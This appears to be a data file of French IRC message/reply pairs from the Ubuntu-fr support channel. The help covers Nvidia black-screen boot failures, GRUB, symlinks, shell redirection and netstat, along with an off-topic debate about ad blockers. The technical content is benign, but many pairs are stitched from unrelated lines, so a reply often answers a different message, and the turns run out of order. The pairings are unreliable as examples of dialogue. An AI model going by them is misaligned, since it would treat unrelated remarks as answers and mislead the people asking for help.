monter*	Oui, j'ai compté une fois en installant. De mémoire, / , /home , /usr , /var , /var/usr , /boot , etc... Peut être /bin aussi.
mais mais c'est copyright ça !!	En fait, je croyais qu'on était limité aux 8 choix que propose Ubiquity.
grmlgmrlmg	Lol.
sur ce pc jai mis une partition efi en plus (car on me le demandait ) mais le resultat est idem ecran noir si jeteint	J'ai n'ai pas bien compris pour le second ordinateur, déjà une partition uefi, ça ne veut rien dire, car ces 2 choses n'ont rien à voir. Et il est logique d'avoir un écran noir lorsqu'on éteint... :-/
avec startx ca demarre mais cest pas n,ormal et quand jeteint y demande le mot de passe????	Donc, sur le premier ordinateur, tu as un prompt où tu t'identifies, lances stratx et accède à ton bureau qui marche correctement? Et pour éteindre, il te demande le mot de passe de façon graphique ou une fois en console?
autre chose : sur nautilus est-il possible d'avoir des fonds colorés sur la fenetre ?	Tu montes tes partitions qui sont sur un autre disque à l'endroit des dossiers que tu "déplaces". Je connais mal la syntaxe pour créer les liens, mais c'est super simple. Le jour où tu le fera, conserve bien les commandes pour pouvoir toujours les refaire. Pour nautilus, je ne le connais pas.
à savoir les dossiers téléchargements, documents , musique videos ...	Pas au moment de l'installation puisque c'est tout /home que tu peux mettre dans une autre partition, mais juste après tu peux te faire des liens symboliques.
je vai sposter tous les logs un par un sur le topic ubuntu. Je peux le faire, i ln'y a pas de risque sécuritaire ?	Ca risque de faire trop de lecture.
Ca risque de faire trop de lecture.	 que dois je faire alors ?
 que dois je faire alors ?	Déjà, suis l'aide que vient de te proposer alca94.
Déjà, suis l'aide que vient de te proposer alca94.	ah très bien je le fais, merci
bon je vais tester virtualbox	3ème lien de http://doc.ubuntu-fr.org/virtualbox#quelques_tutoriels .
on n'ouvre pas un fichier de log avec un editeur de texte !	comment alors
l installation du bundle par gedit, c est quelquechose de normal?	 non
ca m install le bundle là?	Suivant ton besoin, je crois que tu aurais mieux fais d'utiliser virtualbox. As-tu regardé http://doc.ubuntu-fr.org/vmware ?
Ok c'est ça . Je fais sudo apt-get install quoi pour installer bluegriffon ?	Mais sinon, l'installation est correcte.
Bonjour à tous, je viens d'installer ce matin Xubuntu. Je cherche à mettre un éditeur de texte wysiwig pour modifier des pages html (il n'y a rien par défaut) , je pensais que vim pourrait  faire ça , je l'ai installé   http://lacleduweb.free.fr/temp/vimouestu.png mais  ne voit.   qq peut - il m'aider, faut il que j'installe autre chose ?	Si les lignes "Ajout de « détournement ..." t'ont inquiété, je pense que c'est du au fait que vim-tiny est installé par défaut.
merci	software-center si tu cherches le nom de l'exécutable en lui-même
Donc pour faire pointer un dossier cache vers un autre espace de stockage plus grand, je peu bien utiliser les symlink, si j'ai bien compris.?	oui :)
Salut beaver :)	y'a un bon channel pour ça #ubuntu-fr-testing :þ
Salut :)	'soir
;-)	J'ai déjà oublié cette histoire de livre, mais je crois que tu parles du framabook de Vincent Lozano. Si tu cherches d'autres références, j'en ai. Ca m'a parfois été utile de lire une explication différente sur une fonction car l'approche me convenait mieux.
ça n'a rien a voir avec mon problème de commande de l'autre fois en tout cas clache ^^ merci pour le lien du livre je le dévore au fait ! Moi perso je m'adapte à la distrib mais la c'est un nouvel utilisateur en plus avec un peu d'âge alors je préfère lui facilité le truc	Je me doutais que tu cherchais cela pour un nouveau, mais je voulais livrer mes sensations à tous pour inciter à tenter cette aventure. Pour un nouveau, je suis d'accord qu'il ne faut pas trop le bouleverser.
oui je sais bien mais c'est pour un nouvel utilisateur que j'installe alors je lui donne les meilleurs conditions pour qu'il approuve Gnu/Linux ;-)	Du coup, j'ai fais un test en la plaçant en haut, les premiers jours, je cherchais mon horloge et quelques autres indicateurs. Puis au bout de 5jours, j'ai senti que je m'étais habitué à la disposition haute. Je me suis dis que je continuais ainsi mais que je risquais l'accoutumance en un mois. Ce fut le cas. A la fin du mois, j'étais décidé "à vie" de rester ainsi. ;-)
ouai lubuntu c'est tirage de cheveux leur truc là ... :-(	Personnellement, j'ai transformé gnome puis xubuntu pour tout mettre en bas, relique d'une période sur des systèmes d'exploitation privateurs... Quand, je suis passé à lubuntu, la barre étant en bas par défaut, c'était nickel, sauf que je me suis rendu compte que les rares fois ou j'avais besoin de la souris, c'était dans le haut...
de rien :)	^
http://www.shellcheck.net	Merci, je note. ;-)
j'essaie #bash	##bash-fr je crois. Sinon, il y a la commande /query alis list ou les sites http://searchirc.com/ et http://irc.netsplit.de/channels/ .
"declare -a pages" n'est pas accepté non plus	Sitôt, je poserai ma question sur un salon bash, non?
Yessir les gars mon problème est complétement résolu, preuve qui ne faut jamais baisser les bras :D	J'ai lu ton post sur le forum. Je suis content pour toi. Par contre, si je n'y écris pas, c'est parce que je veux rester anonyme et que les moteurs de recherche ne m'indexe pas. Tu pourras passer le post en résolu.
salut il y a un personne qui a prendre une photo a une personne que je cannait est il a fait un tagged avec un nom vertielle	On n'aide qu'en public afin que quelqu'un ayant une meilleure réponse puisse la donner. Ca permet aussi d'avoir des astuces sur des questions que l'on ne s'était même pas posé. Enfin, ça permet d'éviter que quelqu'un fasse faire à un autre quelque chose de mauvais. C'est dit là http://doc.ubuntu-fr.org/conduiteirc#n_envoyez_pas_de_messages_prives_aux_usagers_du_canal .
comment contacter un administrateur tagged	Ta question n'est pas assez précise. Il faut nous donner le contexte et plus de détails. Pour apprendre à mieux poser des questions, lire http://www.gnurou.org/writing/smartquestionsfr est très utile.
ah pardon	bah clairement, je préfère me tapper 30s de pub vidéo forcée pour accéder à ensuite 20min de divertissement gratuit que de payer un abonnement par mois après
Zic je doute que Youtube passe payant, car si ça arrivait il y aurait des offres gratuites concurrentes, ce que Youtube ne veut pas ils préfèrent gagner peu mais rendre impossible l'émergence d'une concurrence, je pense.	pourtant, c'est le cas pour YouTube
Zic je donne un temps de visionnage de pub, oui j ecomprends ton idée. C'est comme si je donnais mon temps de cerveau disponible à une marque. Economiquement ok mais dans ma perception, dans ma pratique, tout est gratuit. Tu vois ce qu eje veux dire ? C'est ça qui compte, pas la subtilité de cette micro publicité invisible.	tu cite le président de tf1 là
tu cite le président de tf1 là	c'est son expression "temps de cerveau disponible" oui
Oui je sais mais à mon vis, c'est totalement gratuit. On peut répéter un million de fois que google ou youtube ne sont pas gratuit et que JE suis le produit, en fait, tout est gratuit quand même.	c'est confirmé hein
Zic oui, je lui "vole" son travail, je vis au dépend des autres par parasitisme si on veut. Mais je ne supporte pas la publicité, j'ai un myen facile de les virer, et puis dernier argument je suis très peu influencé par la publicité (comme beaucoup d'autres) alors je suis un pur parasite par nature	Adblock permet déjà de gérer quel site tu veux whitelist
Autrefois seul les petits monarques (à l'exclusion des monarchies combattantes) décadants avaient cette impression, maintenant tout le monde peut l'avoir.	même si tu n'es pas influencé, en ne cliquant pas sur les pubs, ils sont quand même rémunérés
le modèle d'Internet basé sur la pub doit être révisé, mais en attendant, c'est le seul moyen de survivre pour certais médias du Net	c'est possible de bloquer adsense à partir d'un /etc/hosts.deny ?
Quand je dis que les aides sociales et beaucoup de choses sont gratuites, ej veux dire que toutes ces aides de la modernité sociale + la gratuité de l'économie numérique, ça donne l'imprssion que tout est gratuit, ça coupe le lien qu'o perçoit normalement entre travail et résultat (le produit fini) et ça peut donner une habitude mental du tout est du	hors, si le mec ne vit que de ça, tu voles en quelque sorte son travail
Zic pour moi, le contenu est gratuit. La publicité est payé par les entreprises, pas par moi. Et en plus, les pub je les vois pas grâce à google ou à add block plus.	si tu utilises Adblock, tu ne rémunères donc pas l'auteur de la source
merci beaucoup à vou sdeux	Abiword ou gnumeric se lance quand même plus rapidement que libreoffice, c'est pour ça que je les utilise, même si j'ai une machine suffisante aujourd'hui.
et je n'ai pas à être ce quelqu'un	tu as raison, j'ai eu une façon de parler emportée inutilement insultante. Il faut avoir le plus grand respect pour ce travail des autres, gratuit.
Bonjour. J'ai l'impression qu'Abiword de Xubuntu, c'est merdique comparé à LibreOffice, car je peine à utiliser le traitement de texte facilement sur des fichiers odt ou abw. Me conseillez vous de prendre libreoffice à la place ?	-___- "ne correspond pas à mes besoins", c'est pas un synonyme de "merdique"
piti pourtant il n'y en a pas dans upluads/	https://github.com/humhub/humhub/blob/master/uploads/file/.htaccess
(le groupe d'admin impression, quoi)	ah oui, ça me semble pas mal comme idée
Surtout savez-vous corriger ce soucis ? Car je ne dormirais pas plus mal même si j'en connais pas la raison..	pour system-config-printer, il ne faut pas être dans le groupe lpadmin, ou un truc du genre ?
et d'autre dossier aussi	le ".htaccess" fourni semble "protéger" les dossiers "protected" et "uploads/file"
yes	"sécuriser" les données c'est un peu vague, non ?
oui apache2	à priori, ton serveur tourne avec l'identité de l'utilisateur www-data. C'est probablement une bonne idée de lui donner les fichiers de ton service
sur une clé usb ? :p	il faut toujours partir du principe qu'un accès physique à la machine == usage possible de ta machine
non ?	Une live usb et ton grub est contourné...
a votre avis mettre en place un mot de passe sur un grub reste capitale en terme de sécurité ?	Capital, assurément non. Utile, faut voir, sachant que si quelqu'un a un accès physique à la machine, il peut s'y introduire.
Beh un peu pour tout généralement.	ça dépend de toi surtout. Es tu près à mettre souvent à jour ? (au profit de quoi tu auras des logiciels plus récents, et probablement plus de bugs)
Pour une utilisation quotidienne, dois je faire les mises à jour tout les 6 mois ou juste les LTS ?	tout dépend comment tu utilise ta machine
mais j'ai apparement des probléme de droits de fichiers	comment as tu procédé ? as tu suivit une documentation ?
Je cherche un outil de mind mapping facile à utiliser et dont le format de stockage est éditable facilement par un script. Merci d'avance.	http://doc.ubuntu-fr.org/bureautique?s[]=mind&s[]=mapping#cartographie_heuristique_mind_mapping .
http://doc.ubuntu-fr.org/bureautique?s[]=mind&s[]=mapping#cartographie_heuristique_mind_mapping .	merci. je vais les tester
merci. je vais les tester	Je n'y connais rien, mais la liste est différente sur http://doc.ubuntu-fr.org/carte_heuristique . De rien. :-)
Je n'y connais rien, mais la liste est différente sur http://doc.ubuntu-fr.org/carte_heuristique . De rien. :-)	apparement Freeplane correspondrait à mes besoins
Bonsoir	Pose ta question en nous donnant un maximum de précision. #ubuntu-fr est un salon de support, nous restons silencieux si il n'y a pas de question de posée. Pour discuter, nous utilisons #ubuntu-fr-offtopic. Et sinon, une consultation de http://www.gnurou.org/writing/smartquestionsfr est universellement utile.
Pose ta question en nous donnant un maximum de précision. #ubuntu-fr est un salon de support, nous restons silencieux si il n'y a pas de question de posée. Pour discuter, nous utilisons #ubuntu-fr-offtopic. Et sinon, une consultation de http://www.gnurou.org/writing/smartquestionsfr est universellement utile.	Merci.
ça en met moins ?	yes
Il doit y avoir un paquet qui contient les traductions, mais je ne le trouve pas	http://elementary.io/support   visiblement ils conseillent google+ et reddit pour leur support
version gimp 2.8.1, et j'utilise elementary os	C'est un salon ubuntu ici...
Bonjour, comment je peux mettre gimp en francais ?	De base, il l'est chez moi. Quelle est ta variante et version?
tcpdump: 192.168.50.21: No such device exists	Il y a aussi un wiki http://fr.callofduty.wikia.com/wiki/Wiki_Call_of_Duty qui a un chat intégré.
tcpdump -i ... "host 1.2.3.4 or host 5.6.7.8"	ça marche pas la syntaxe tcpdump -i 192.168.50.
j'en treouve pas	http://www.cod-gamer.net/dossiers/read/127/ et des salons irc http://irc.netsplit.de/channels/?chat=call+of+duty , notamment ceux sur le réseau quakenet.
Ca va pas être facile de voir ce qui va pas.. Ils ont pas des forums d'entraide ?	comment tu filtre sur tcpdump pour ne voir que les ip défini ?
C'est quoi ton app en fait.. c'est "maison" ?	non c'est un serveur call of duty 4
est ce qu'on peut voir sur le serveur les port qui sont demadné ?	en root : netstat -nplu
merci clache le ">" me donne le meme resultat qu'avec ">>" il me donne que le resultat de charge de la batterie	Oui, la première fois, mais avec ">>", il les accumule pour en faire un historique.
Oui, la première fois, mais avec ">>", il les accumule pour en faire un historique.	je t'explique ce que je veux faire avec cette commande à ralonge, je veux en faire un bash "infobat.sh" par exemple qui m'évite de resortir cette commande
je t'explique ce que je veux faire avec cette commande à ralonge, je veux en faire un bash "infobat.sh" par exemple qui m'évite de resortir cette commande	Cette dernière méthode, tu tapes les premières lettres d'une commande puis remonte dans ton historique les commandes commençant par ces lettres. C'est un super comportement qui n'est pas mis par défaut.
Cette dernière méthode, tu tapes les premières lettres d'une commande puis remonte dans ton historique les commandes commençant par ces lettres. C'est un super comportement qui n'est pas mis par défaut.	merci pour tes conseils, ils sont bien utiles
merci pour tes conseils, ils sont bien utiles	De rien. :-)
y a rien qui passe	tu lances quoi, côté client ?..
http://ubuntuhandbook.org/index.php/2014/01/boot-into-text-console-ubuntu-linux-14-04/	bon j'ai retenté la manipulation et l'écran s'éteint après avoir déballé les textes de démarrage normaux, mais en premiere ligne j'ai ERROR: no video mode activated et ensuite ca défile et à la fin l'écran s'éteint. Jpeux pas mieux décrire ca se passe très vite.
L4L13N-DROID pour completer la commande pour la batterie tout à l'heure qui marche nikel, je voudrais voudrais l'écrire dans un fichier mais il me retour que le resultat comment je peux faire	Tu voudrais plutôt faire un raccourci. Pour écrire un script, je te conseille de t'aider de http://framabook.org/unix-pour-aller-plus-loin-avec-la-ligne-de-commande par exemple, j'ai d'autres livres si tu veux. Mais sinon, il te suffirait de faire un alias ou encore d'avoir une modification de ton bash qui recherche dans ton historique.
non c'est de l'udp il me semble	netstat -ua
Si tu fais telnet 127.1 28960, ça dit quoi ?	telnet: Unable to connect to remote host: Connection refused
ok, tu peux faire: cat /etc/default/grub | grep GRUB_GFXMODE	No Caching mode page found en igfx
merci	La version avec un seul > écrase le fichier original à chaque utilisation(j'espère être assez clair).
bon ben je sais maintenant que si je ne recharge pas je vais couper	Pour toute commande, tu ajoutes "> fichier.txt". Avec ">> fichier.txt" il rajoute à la fin du fichier ce que donne la nouvelle commande.
meme en désactivant le firewall je ne vois aucun port ouvert a pars le ssh	je ne vois aucun port ouvert a pars le ssh <-- tu vois ça comment, au netstat ?..
je ne vois aucun port ouvert a pars le ssh <-- tu vois ça comment, au netstat ?..	je fais un scan de la machine avec un autre pc
Je suis loggé	si t'as suivi, il suffit de faire: sudo mv /etc/default/grub.orig /etc/default/grub && sudo update-grub
Oui	pour te simplifier les manips, remets le grub d'origine
Désolé ce fou tu clavier Android... error: no vidéo mode activated	tu peux te logger sur la console ?
No vidéo mode activated	ok t'es sur la console la ?
J'ai filmé	t'as rien vu, ni texte rien du tout?
Comment je reviens en mode desktop?	bah t'as qu'à faire les manips inverses
Je me suis loggué	mais remets les pilotes nvidia-current et installe nvidia-prime
J'ai trouvé ceci: http://forum.ubuntu-fr.org/viewtopic.php?id=396258 t'en penses quoi?	je sais pas mais c'est assez vieux
ou: upower -i /org/freedesktop/UPower/devices/battery_BAT0	ce matin j'ai essayé d'intaller le pilote libre par curiosité et de repasser en Discrete: Echec
ce matin j'ai essayé d'intaller le pilote libre par curiosité et de repasser en Discrete: Echec	c'est forcément un truc avec grub et splash
c'est forcément un truc avec grub et splash	j'ai aussi essayé le 331.113: echec alord j'ai remis le 304.125 que tu m'avais fait installer
ben voila c'est que j'ai trouvé	 eh bien pas de problème
bonjour existe-t-il une commande pour connaitre la charge de la batterie avec le terminal?	ca dépend de ton matériel à ce que je peux voir.
ça n'a rien à voir	o/
o/	bien dormi ?
je parlais de celle-la car la version dans sid était plus ancienne que celle pour ubuntu 15.04	ubuntu a la version 3.2.8
oui	Oui, xterm utilise un presse-papier qui n'est pas le presse-papier général.
bon je vais mettre dans un fichier, et je vais l'ouvrir avec firefox	Xterm est vraiment limité comme terminal, lxterm est déjà plus facile.
je l'avais copié depuis windows ailleurs	"sudo lshw -c display" te donnera également le nom du pilote que tu utilises.
Je sais aps quoi faire avec xrandr	As-tu regardé http://doc.ubuntu-fr.org/xrandr ?
salut, s'il vous plait pardonnez l'intrusion, personne ne sait d'un endroit pour parler de France en anglais (Google Translate)	On est pas un annuaire, il y a la commande /query alis list ou les sites http://searchirc.com/ et http://irc.netsplit.de/channels/ .
pinta compliqué ???	j'ai refais un test
Grande nouvelle : une Bento "Sushi" vient de sortir en test	je prends
thanx melodie	Si elle utilise skype, tu dois en faire autant sur ubuntu. Par contre, elle peut utiliser ekiga sur windows, c'est moins complexe.
mais c'etait pour les modifs mineurs	si tu veux un outil pour dessin vectoriel, je te conseille inkscape
si tu veux un outil pour dessin vectoriel, je te conseille inkscape	+1 merci
merci	http://doc.ubuntu-fr.org/graphisme#graphisme_avance sinon.
thx i will tryx	ou gnome-paint
au niveau de l'interface	Mtpain.
bon je vais tester	C'est un ubuntu-core qu'il te fallait plutot.
je veux aps avoir pleind e paquets inutiles	Oui, mais tu n'as pas x.
bonjour, j'ai installé les paquets "awesome" et "lightdm-gtk-greeter" sur ubuntu server 14.04.2, mais ça boot sur un tty, pas sur un gui. que faire ?	Pourquoi vouloir une ui sur un serveur?
Je retourne en igfx	ça doit etre le démarrage d'ubuntu alors
lol	on poursuivra ça plus tard peut etre
va falloir switcher le cable en bas et mettre Discrete dans le bios aussi	http://paste.ubuntu.com/10806606/
sans redémarrer	http://paste.ubuntu.com/10806588/
meme en windows lorsque je branchais ma carte en hdmi javais l'impression d'un petit lag	et si tu rebranchais ton cable sur le hdmi de la carte nvidia
http://paste.ubuntu.com/10806564/	est ce que c'est plus fluide ?
voila	sudo lshw -c display | pastebinit
http://paste.ubuntu.com/10806509/	avant de redémarrer, tu peux faire un sudo lshw -c display | pastebinit
ni les pilotes nvidia	 c'est fait
 c'est fait	on c'est bon
je suis en train dentrer les commandes mais je vois les driver 304.125 et 331.113 dans les Pilotes DDitionnels	"sudo apt-get install pastebin" puis "dpkg -l | grep nvidia | pastebinit"
pkoi il la fait pas marcher alors	parce qu'il n'a pas nvidia-prime
Techniquement si ma carte focntionne bien sous windows 7 elle n'est pas endommagée hein?	je te propose de remettre IGFX, de te mettre sur ubuntu et d'installer les pilotes nvidia
jy vais de ce pas hehe	oui elle le devrait pas
ouain 2011... ctrl+alt+f1 vaut le coup d'essayer mais une fois que je suis en mode console, je sais foutrement pas quoi écrire :S	tu nous diras si t'es sur la console
simplement mauve	Au moment où ça bloque, il faut passer en console par Ctrl+Alt+F1.
non pas de logo ubuntu	t'as le grub ou pas ?
c'est a-p-p ca	donc pas de logo du tout
jai déja essayé une gtx 760 dedans	et ça coince au niveau quoi sur ubuntu ? est ce que tu vois le logo ubuntu ?
555	cette GTX a déjà fonctionné avant ?
cette GTX a déjà fonctionné avant ?	oui a merveille
j'ai été chanceux	et c'est quoi la carte qui etait dans le boitier alors?
ha non pour le disque, j'ai pas vu qu'il yen a 2 à 256, ça fait donc 512	j'ai la gtx 555 je l'ai acheté à un gars sur un site de vente par internet 500$ environ 375Euro
mais asus c'est du solide, je paye la marque ici	Oui, c'est le tactile qui fait ça. Les cpu doivent être quasiment les mêmes(0,2GHz de différence).
ça ressemble plutot à un système qui va se mettre sur une carte qui est eteinte d'office	Le second me semble mieux, tactile, moins de RAM, de VRAM et de disque dur, mais un meilleur wifi, batterie. En fait, ça me semble plus équilibré si ça fonctionne.
Le second me semble mieux, tactile, moins de RAM, de VRAM et de disque dur, mais un meilleur wifi, batterie. En fait, ça me semble plus équilibré si ça fonctionne.	oui mais 300-400 euros plus cher :)
Je vais aller updater le forum maintenant	http://laruche.com/2012/04/20/test-alienware-x51-527047
https://wiki.gnome.org/HowDoI/HiDpi	Sur le modèle que tu indiquais, c'est le fonctionnement du wifi n qui m'inquiète. Sinon, les 4Gio de VRAM et les 16 de RAM sont trop.
Sur le modèle que tu indiquais, c'est le fonctionnement du wifi n qui m'inquiète. Sinon, les 4Gio de VRAM et les 16 de RAM sont trop.	oui mais y'a celui la avec 8Go RAM, un peu plus cher http://www.ldlc.com/fiche/PB00180787.html
oui mais y'a celui la avec 8Go RAM, un peu plus cher http://www.ldlc.com/fiche/PB00180787.html	Oui, tout à l'heure j'ai mélangé wifi n et ac...
Bon j'ai changé le fil jai enlevé la pile, attendu 5 minutes remi la pile et ça n'a pas réglé le problème d'écran noir sur ma carte vidéo.	tu peux pas remettre les configs d'origine ?
http://www.ldlc.com/fiche/PB00173042.html	Faut revendre la moitié d'un brevet ;-) . Bel objet, vu la taille de l'écran, il doit avoir un pitch d'enfer... Plus besoin d'antialiasing...
Je vais tenter d inverser les fils et d'enlever la pile	Pour ce matin, je ne peux plus réfléchir, mais sur ton post du forum, tu peux déjà indiquer comment tu as pu faire pour réinstaller et on cherchera comment refaire marcher les 2 cartes.
là je vise un zenbook :D	Il y a 2560x???? avant. Sinon, l'ultra HD, c'est 3840x2160... Ou du multiécran. ;-)
Il y a 2560x???? avant. Sinon, l'ultra HD, c'est 3840x2160... Ou du multiécran. ;-)	celui là est le géant le moins cher
c'est peut etre ça	Tu sais ce qui me change le plus entre mon ancien pc et l'actuel, ce n'est pas d'avoir 8 fois plus de mémoire, ce n'est pas d'avoir plus 8 fois de disque dur, ce n'est pas d'avoir un processeur qui doit être environ 4 fois plus puissant, mais passer de 1024x768 à 1600x900... :-)
Tu sais ce qui me change le plus entre mon ancien pc et l'actuel, ce n'est pas d'avoir 8 fois plus de mémoire, ce n'est pas d'avoir plus 8 fois de disque dur, ce n'est pas d'avoir un processeur qui doit être environ 4 fois plus puissant, mais passer de 1024x768 à 1600x900... :-)	sur un portable t'as 2560x1440 et 3200x1800
je vais pouvoir acheter un portable avec ça	Cool. :-)
Cool. :-)	bah moi j'ai déjà 1920x1200 sur mon pc; l'étape d'après c'est le QHD 3200x1800 je pense
:-)	he oui ça fait un sacré pas là
Mon câblage?	t'as dit que t'as bidouillé pour rebrancher ta carte
Mauve puis eteint	je pense que c'est ton cablage de ta carte alors
trier ou pas, ce n'etait pas l'objectif	Si je te demande si tu sais trier, ça serait pour l'expliquer à d'autres.
Si je te demande si tu sais trier, ça serait pour l'expliquer à d'autres.	moi je sais un peu mais en général je soumets un nouveau rapport de bug, je laisse les équipes launchpads décider si le bug est nouveau ou un dupliqué
moi je sais un peu mais en général je soumets un nouveau rapport de bug, je laisse les équipes launchpads décider si le bug est nouveau ou un dupliqué	Ok, merci.
Ok, merci.	hé oui, ce n'est pas un bug que j'ai soumis, c'est un brevet
Planté	écran noir au démarrage ?
il suffit de lui indiquer le chemin, et c'est à lui de soumettre ou pas	Oui, mais il faut trier ensuite. Tiens, tu sais trier les bugs?
Oui, mais il faut trier ensuite. Tiens, tu sais trier les bugs?	il dit qu'il a soumis des bugs mais qu'il n'arrive pas à savoir si ça a été résolu ou pas, je lui ai dit de s'inscrire pour avoir une liste de bugs attachée à son pseudo
il dit qu'il a soumis des bugs mais qu'il n'arrive pas à savoir si ça a été résolu ou pas, je lui ai dit de s'inscrire pour avoir une liste de bugs attachée à son pseudo	Ah, je n'avais pas compris qu'il avait fait un vrai rapport. Car lancer apport ne t'identifies pas.
Ah, je n'avais pas compris qu'il avait fait un vrai rapport. Car lancer apport ne t'identifies pas.	j'ai gagné 1000€ en soumettant un brevet :)
C'est sur que je vais le faire à la fin	n'oublie pas le cable hdmi, à remettre sur la nvidia
Ca sent bon chez-soi :D	t'es encore avec IGFX la ?
Merci les gars reste à configurer pour ma nvidia mais ça semble être un succes	Après un premier démarrage sur le disque dur qui marche, tu la réactiveras. Et regardera http://doc.ubuntu-fr.org/nvidia_optimus .
Logique mezen	après l'installation et redémarrage, active la carte dans ton bios (Discrete).
Ça y est je me sentirais coupable à jamais	Tu pourras mettre en résolu sur le forum, n'oublie pas.
Est-possible de conserver le son hdmi mais d'utiliser les graphique de ma carte nvidia tu penses clache?	faut passer par le port hdmi de ta carte nvidia, le tout en bas
Non installation en cours :-)	Le son, je maîtrise moins.
Je n'ai vu aucune option optimus	est ce que ça fait toujours l'ecran noir ?
Effectivement je n'est plus d'affichage je doit brancher le câble hdmi à ce point	essaye donc avec la carte intégrée, on verra bien ce que ça donne.
Cetait déjà en discrete	regarde aussi si t'as pas optimus activé
Je prend des photos	c'est ta carte nvidia
J'arrive sous Windows je suis prêt à essayer différentes versions/iso	Il y aura toujours la solution de démonter la carte, d'installer, puis de tester un remontage... Mais c'est moyen comme solution.
Uefi*	Oui.
javais pas vu cette prise	Sur mon lien ↑ , au point 3.1, ça dit "nouveau.modeset=0".
Sur mon lien ↑ , au point 3.1, ça dit "nouveau.modeset=0".	 j'ajoute ca en escape? Ou bien je tente d'installer ubuntu avec ma carte inboard et mon cable hdmi que je viens de sortir du placcard?
 j'ajoute ca en escape? Ou bien je tente d'installer ubuntu avec ma carte inboard et mon cable hdmi que je viens de sortir du placcard?	Je ne sais pas. Testes ce que tu veux en premier.
désolé	http://forums.autodesk.com/t5/hardware/disabling-nvidia-optimus-amp-perform-clean-install/td-p/4363279
Ici c'est la bonne marche a suivre? au moment de booter le cd, le moment ou t'as plusieurs trucs a choix tu appuye sur tab et la t'aura 2-3 ligne de text qui vont apparaitre tu ecrit i915.modeset=0 directement apès et ensuite tu appuye enter pour booter. je sais pas si ça vas marcher mais tu peux tenté	dans ton bios tu peux le faire je pense, et à la limite, ouvre ton boitier et déconnecte la nvidia
dans ton bios tu peux le faire je pense, et à la limite, ouvre ton boitier et déconnecte la nvidia	http://i.pcworld.fr/1232709-alienware-x51-12-.jpg
http://i.pcworld.fr/1232709-alienware-x51-12-.jpg	je vois bien une hdmi tout en haut à gauche
En lisant ceci: http://openclassrooms.com/forum/sujet/erreur-ecran-noir-lors-de-l-installation-15763 je me demande si ce n'est pas la série 500 de nvidia qui cause problème avec le pingouin	Ton lien est une piste intéressante.
Bon! C'est beaucoup plus lisible	je t'avais dit de désactiver l'une des cartes mais tu avais dit que t'en avais qu'une seule alors là.. j'ai plus rien à proposer
ca commencé comme ca	Tu regarderas le lien http://doc.ubuntu-fr.org/nvidia_optimus quand tu auras le temps. Ca explique la cohabitation nvidia/intel i7 3770.
je te donne l'adresse si tu le souhaites	La semaine dernière, tu avais incité un troll à rapporter sur launchpad. Je pense qu'ils ont autre chose à faire. :-)
La semaine dernière, tu avais incité un troll à rapporter sur launchpad. Je pense qu'ils ont autre chose à faire. :-)	un troll, je le décrirai pas comme ça mais bon
un troll, je le décrirai pas comme ça mais bon	Mais ce n'est pas grave.
cet alienware faut l'envoyer sur mars	Il voyait des bugs partout... ;-)
pas plus avancé	laisse moi 5 minute pour installer le driver de ma carte et redémarrer et je vais etre plus efficace
Peut être tenter une 32bits?	oki, j'y vais par élimination, avec les elements que nous avons c'est pas evident ;)
à quelle adresse as tu dl l'iso Ubuntu L4L13N-DROID ?	laissons faire le passé et donnes moi une adresse que tu me conseille ainsi qu'une facon de le graver
ou francophone ?	On ne fait plus d'iso francophone à cause de secure boot.
L'écran s'est eteint	Je ne sais pas, je n'ai pas l'habitude des uefi. Mais je suppose que sur un alienware il y a plein d'options.
qu'est ce que je peux avoir changé au bios qui aurait dérangé quoi que ce soit?	Activer la nvidia qui était éteinte.
Moi, je pense plutôt à un conflit entre les 2 cartes graphiques.	pourquoi ça fonctionne plus, ràs auparavant, le seul element qui a changé entre temps, l'iso
quand jai voulu reinstaller ubuntu 14.04 ca faite la meme chose l'écran ferme	enlève la carte et essaye sans
la 555 fonctionnais tres bien jusqua hier matin	C'est un ivy bridge https://fr.wikipedia.org/wiki/Intel_Core_i7#Ivy_Bridge . Tu as 2 cartes graphiques qui partagent une sortie.
la carte video que javais essayé n'était pas compatible	ok, une autre question, plus aucune version nux ne fonctionne sur ton pc depuis que tu as windows d'installé ?
jai tenté UEFI mais la gtx555 nest pas compatible alors jai remi en legacy	t'as pas un autre pc ?
oui dailleur tantot jai ouvert la tour pour brancher le 2 au lieu du 1 et ca rien changé	si tu veux de l'aide pourrais tu répondre aux questions je te prie, merci
si tu veux de l'aide pourrais tu répondre aux questions je te prie, merci	la seule chose que jai changé c'est les boot mode
oui 100%	Ton i7, c'est pas un sandy/ivy bridge?
une seule carte	sais tu ce que t'as effectué l4l13n ? ou bien tu étais en mode découverte, et tu as save les modifications pour voir ce que ça fait ?
meme essayer ubuntu l'écran s'éteint	ta carte c'est une GTX 555 ?
avec un simple cd d'ubuntu ca fonctionne?	l'iso -desktop oui
C'est surement un problème avec le bios mais je vois pas quoi	t'as essayé d'installer depuis le bureau du live ?
salut	Je n'avais jamais vu un cas comme l4l13n.
c un probleme de compatibilité qui vient de survenir subitement comme ca	En conservant la même version d'ubuntu, ça n'aurait pas du.
mais pourtant tout allais bien avant	Ce qui est étrange, c'est qu'elle marche toujours avec windows.
ok	Et nautilus non plus, c'est un autre gestionnaire de fichiers.
Et nautilus non plus, c'est un autre gestionnaire de fichiers.	je ne m'attendai à rien d'autre... boot le CD de Fedora Live... apres 5 secondes le cd se met a travailler et l'écran s'éteint. Même foutu problème!
je ne m'attendai à rien d'autre... boot le CD de Fedora Live... apres 5 secondes le cd se met a travailler et l'écran s'éteint. Même foutu problème!	:-(
j'utilise Nautilus, Audacity, VLC, firefox, xchat, xterm, gedit, synaptic, playonlinux, wine et transmission. Est-ce que je vais être dépaysé?	Non, car tout ces logiciels y sont, sauf synaptic. Il y a un logiciel équivalent pour les paquets rpm.
dans le fond, qu'est ce qui change pour l'utilisateur en passant de ubuntu a fedora?	Le format des paquets. Et plusieurs logiciels interne.
Mais ca me ferai vraiment un plaisir fou d'assister a un tel évennement	Il n'y font pas de dépannage, c'est ici, mais il y a un salon #ubuntu-qc . Il sert à organiser des réunions, mais il y a beaucoup moins de monde.
je suis québecois, ca semble être européen	http://www.agendadulibre.qc.ca/event/2015/4/ .
C'est quoi? Des techniciens avancé avec qui on peux predre des rendez-vous style team-viewer?	Je ne connais pas team-viewer. Ce sont des associations qui organise des install-party. Tu amènes ton ordinateur sur place.
j'ai un stiker ubuntu sur mon char, ca serais de la fausse représentation lol	Sinon, je te conseillerai de rendre visite à un gull http://www.ubuntu-fr.org/gull .
Mais si ca peut aider a cerner ce qui ne va pas je le fait j'ai absolument rien a perdre	Oui, et tu mets une ubuntu dans virtualbox.;-)
